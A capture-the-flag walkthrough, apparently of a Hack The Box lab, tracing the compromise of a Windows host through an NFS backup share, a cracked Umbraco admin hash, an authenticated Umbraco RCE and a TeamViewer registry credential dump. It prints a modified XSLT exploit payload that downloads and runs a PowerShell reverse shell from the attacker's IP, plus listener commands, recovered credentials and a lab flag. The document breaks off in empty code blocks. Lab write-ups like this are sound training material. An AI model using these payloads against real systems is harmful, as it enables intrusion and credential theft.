
## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -F 10.129.37.29            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 12:29 -0500
Nmap scan report for 10.129.37.29
Host is up (0.026s latency).
Not shown: 93 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 0.78 seconds
```


```
nmap -p 21,80,111,135,139,445,2049 -sCV  10.129.37.29
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 12:29 -0500
Nmap scan report for 10.129.37.29
Host is up (0.029s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-10T18:30:27
|_  start_date: N/A
|_clock-skew: 59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.29 seconds
```

```
nmap -sCV -p 2049 10.129.37.29
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 12:45 -0500
Nmap scan report for 10.129.37.29
Host is up (0.029s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  mountd  1-3 (RPC #100005)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```

I was able to access the ftp share anonymously, but there was nothing inside.

```
ftp 10.129.37.29
Connected to 10.129.37.29.
220 Microsoft FTP Service
Name (10.129.37.29:saitama): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49692|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp>
```

Write Permissions were also not there.

```
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49693|)
550 Access is denied. 
ftp>
```

Decided to move onto the webpage running on port 80.

The webpage seems to have normal functionalities, decided to enumerate endpoints.

```
gobuster dir -u http://10.129.37.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.37.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/contact              (Status: 200) [Size: 7880]
/blog                 (Status: 200) [Size: 5001]
/home                 (Status: 200) [Size: 6703]
/products             (Status: 200) [Size: 5338]
/people               (Status: 200) [Size: 6749]
/product              (Status: 500) [Size: 3420]
/Home                 (Status: 200) [Size: 6703]
/Products             (Status: 200) [Size: 5338]
/Contact              (Status: 200) [Size: 7890]
/install              (Status: 302) [Size: 126] [--> /umbraco/]
/Blog                 (Status: 200) [Size: 5011]
/about-us             (Status: 200) [Size: 5451]
/People               (Status: 200) [Size: 6749]
/Product              (Status: 500) [Size: 3420]
/INSTALL              (Status: 302) [Size: 126] [--> /umbraco/]
/master               (Status: 500) [Size: 3420]
/1112                 (Status: 200) [Size: 4051]
/intranet             (Status: 200) [Size: 3313]
/1117                 (Status: 200) [Size: 2750]
/1114                 (Status: 200) [Size: 4236]
/person               (Status: 200) [Size: 2741]
```

Found an interesting /umbraco endpoint which provides login functionality.

## Vulnerability Assessment

```
searchsploit Umbraco           
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                         | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                  | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                  | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                     | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                  | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                                            | aspx/webapps/50462.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Inspected several multiple exploits, but most of them require authentication. Let's move on with enumerating RPC.

We got access denied, when trying to connect to RPC.

```
rpcclient -U''%'' 10.129.37.29
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

Tried to enumerate smb shares anonymously, but also didn't work.

```
smbclient -L \\10.129.37.29  
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

Enumerated available NFS Shares.

```
showmount -e 10.129.37.29
Export list for 10.129.37.29:
/site_backups (everyone)
```

Mounted the /site_backups share onto my local machine.

```
mkdir /mnt/site_backups
```

```
mount -t nfs 10.129.37.29:/site_backups /mnt/site_backups
```

After viewing the files I came to the realization that there is an Umbraco Directory. I searched up where Umbraco is storing credentials.

```
App_Data\Umbraco.sdf
```

Viewed the file and grep'd for admin. Retrieved the hash of user "admin".

```
strings Umbraco.sdf | grep -i -A2 -B2 "admin"
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
```

Decoded it on www.crackstation.net

```
baconandcheese
```

## Initial Access

Logged into the CMS with following credentials:

```
admin@htb.local:baconandcheese
```

Enumerated Version of Umbraco.

```
Umbraco version 7.12.4
```

Since we are now authenticated we can try to leverage the exploit's we discovered earlier.

```
aspx/webapps/46153.py
```

I modified the initial exploit and added this as payload variable:

```
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring(\'http://10.10.14.161/Invoke-PowerShellTcp.ps1\')";    System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> '
```

Instead of executing calc.exe on the target system, it will now download and execute an .ps1 reverse shell which should provide me RCE.

1. Started up python webserver on local machine.

```
python3 -m http.server 80
```

2. Started up listener on port 443.

```
rlwrap nc -lvnp 443
```

3. Ran exploit.

```
python3 46153.py
```

Gained RCE as user "iis apppool\defaultapppool".

```
rlwrap nc -lvnp 443           
listening on [any] 443 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.37.29] 49731
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

Retrieved user.txt in C:\Users\Public\Desktop.

```
999f2e0363560b0965826f045c8f13bc
```

## Privilege Escalation

Enumerated Services on the target system.

```
PS C:\Users\Public\Desktop> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     78       5     2044       3560       0.00   2468   0 cmd                                                          
     81       5     3256       3720       0.00   4640   0 cmd                                                          
    148       9     6668      12340       0.03   1324   0 conhost                                                      
    148       9     6660      12320       0.03   1548   0 conhost                                                      
    151      10     6656      12272       0.03   3184   0 conhost                                                      
    148       9     6660      12316       0.02   3720   0 conhost                                                      
    148       9     6628      12308       0.05   4428   0 conhost                                                      
    148       9     6616      12300       0.02   4972   0 conhost                                                      
    410      15     2220       5264               380   0 csrss                                                        
    162      13     1656       4736               496   1 csrss                                                        
    256      14     3944      13268              1260   0 dllhost                                                      
    529      21    18044      36404               928   1 dwm                                                          
     49       6     1508       4016               772   0 fontdrvhost                                                  
     49       6     1664       4268               780   1 fontdrvhost                                                  
      0       0       56          8                 0   0 Idle                                                         
    198      16     6604      15092              2104   0 inetinfo                                                     
    463      27    10716      45576              3760   1 LogonUI                                                      
    869      22     5104      14072               640   0 lsass                                                        
    223      13     2956      10144              3344   0 msdtc                                                        
    593      64   115732     109644              2320   0 MsMpEng                                                      
    111      16     1768       5284              2384   0 nfssvc                                                       
    459      25    78780      86408       0.47   1204   0 powershell                                                   
    461      25    78684      86328       0.58   1232   0 powershell                                                   
    462      26    78832      86460       0.52   4016   0 powershell                                                   
    588      31   118016     126868       1.09   4556   0 powershell                                                   
    459      25    78776      86416       0.50   4896   0 powershell                                                   
      0      11      280      20300                88   0 Registry                                                     
    604      36    16268      19224              4236   0 SearchIndexer                                                
    334      10     3832       7900               624   0 services                                                     
     53       3      516       1228               268   0 smss                                                         
    469      22     5784      16176              2028   0 spoolsv                                                      
    485      28    12424      19020               324   0 svchost                                                      
    548      18    11592      17612               332   0 svchost                                                      
    572      17     4560      13992               740   0 svchost                                                      
    621      16     3508       9940               856   0 svchost                                                      
   1467      51    35360      60224              1004   0 svchost                                                      
    338      16    14256      15860              1088   0 svchost                                                      
    821      28     7612      18960              1132   0 svchost                                                      
    668      39     8636      21956              1220   0 svchost                                                      
    166      12     3836      10536              1424   0 svchost                                                      
    284      12     1876       7780              1440   0 svchost                                                      
    487      19    14652      27860              1536   0 svchost                                                      
    405      32     6316      15220              1556   0 svchost                                                      
    327      16     5148      12356              1600   0 svchost                                                      
    167      12     1768       7156              1704   0 svchost                                                      
    209      12     1844       7376              2180   0 svchost                                                      
    206      11     2312       8464              2252   0 svchost                                                      
    239      15     5224      12312              2260   0 svchost                                                      
    385      24     3372      12048              2404   0 svchost                                                      
    123       7     1440       6184              3752   0 svchost                                                      
    178      12     4696      13592              4344   0 svchost                                                      
   1356       0      192         92                 4   0 System                                                       
   1002      23     5980      19432              2292   0 TeamViewer_Service                                           
    169      12     3220      10548              2192   0 VGAuthService                                                
    132       8     1624       6636              1180   0 vm3dservice                                                  
    286      20     5864      17832              2172   0 vmtoolsd                                                     
   2118     189   553564     467636     784.56   4736   0 w3wp                                                         
    171      11     1448       6932               488   0 wininit                                                      
    250      12     2744      15772               544   1 winlogon                                                     
    363      16     8864      18456              3360   0 WmiPrvSE
```

There is an TeamViewer Instance running!

```
PS C:\Users\Public\Desktop> tasklist /svc

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
Registry                        88 N/A                                         
smss.exe                       268 N/A                                         
csrss.exe                      380 N/A                                         
wininit.exe                    488 N/A                                         
csrss.exe                      496 N/A                                         
winlogon.exe                   544 N/A                                         
services.exe                   624 N/A                                         
lsass.exe                      640 KeyIso, SamSs                               
svchost.exe                    740 BrokerInfrastructure, DcomLaunch, LSM,      
                                   PlugPlay, Power, SystemEventsBroker         
fontdrvhost.exe                772 N/A                                         
fontdrvhost.exe                780 N/A                                         
svchost.exe                    856 RpcEptMapper, RpcSs                         
dwm.exe                        928 N/A                                         
svchost.exe                   1004 DsmSvc, gpsvc, IKEEXT, iphlpsvc, ProfSvc,   
                                   Schedule, SENS, ShellHWDetection, Themes,   
                                   UserManager, UsoSvc, Winmgmt, wlidsvc,      
                                   WpnService                                  
svchost.exe                    324 DsSvc, NcbService, PcaSvc, SysMain, TrkWks, 
                                   UALSVC                                      
svchost.exe                    332 Dhcp, EventLog, lmhosts, TimeBrokerSvc,     
                                   WinHttpAutoProxySvc                         
svchost.exe                   1088 CoreMessagingRegistrar, DPS                 
svchost.exe                   1132 CDPSvc, EventSystem, FontCache, netprofm,   
                                   nsi, SstpSvc                                
vm3dservice.exe               1180 vm3dservice                                 
svchost.exe                   1220 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                   1440 Wcmsvc                                      
svchost.exe                   1556 BFE, mpssvc                                 
svchost.exe                   1704 PolicyAgent                                 
spoolsv.exe                   2028 Spooler                                     
svchost.exe                   1424 AppHostSvc                                  
svchost.exe                   1536 DiagTrack                                   
svchost.exe                   1600 ftpsvc                                      
inetinfo.exe                  2104 IISADMIN                                    
vmtoolsd.exe                  2172 VMTools                                     
svchost.exe                   2180 W32Time                                     
VGAuthService.exe             2192 VGAuthService                               
svchost.exe                   2252 LanmanServer                                
svchost.exe                   2260 W3SVC, WAS                                  
TeamViewer_Service.exe        2292 TeamViewer7                                 
MsMpEng.exe                   2320 WinDefend                                   
nfssvc.exe                    2384 NfsService                                  
svchost.exe                   2404 RasMan                                      
dllhost.exe                   1260 COMSysApp                                   
msdtc.exe                     3344 MSDTC                                       
WmiPrvSE.exe                  3360 N/A                                         
LogonUI.exe                   3760 N/A                                         
SearchIndexer.exe             4236 WSearch                                     
svchost.exe                   4344 StateRepository                             
w3wp.exe                      4736 N/A                                         
cmd.exe                       2468 N/A                                         
conhost.exe                   1324 N/A                                         
powershell.exe                1232 N/A                                         
conhost.exe                   4428 N/A                                         
powershell.exe                4016 N/A                                         
conhost.exe                   4972 N/A                                         
powershell.exe                1204 N/A                                         
conhost.exe                   1548 N/A                                         
powershell.exe                4896 N/A                                         
conhost.exe                   3720 N/A                                         
cmd.exe                       4640 N/A                                         
conhost.exe                   3184 N/A                                         
powershell.exe                4556 N/A                                         
tasklist.exe                   752 N/A
```

Identified TeamViewer7, let's search up for CVE's.

Found CVE-2019 in which plaintext credentials are getting stored in registry hives of TeamViewer.

Downloaded the .bat exploit and ran it.

```
PS C:\Users\Public\Desktop> .\manual_exploit.bat

C:\Users\Public\Desktop>REM # CVE-2019-18988 

C:\Users\Public\Desktop>REM # Teamviewer Local Privesc 

C:\Users\Public\Desktop>REM https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264 

C:\Users\Public\Desktop>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    Version    REG_SZ    7.0.43148


C:\Users\Public\Desktop>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056945579
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x659d58d6
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
```

Retrieved encoded password.

```
FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
```

Found an password decoder .py script from github 

```

```




```

```



```

```



```

```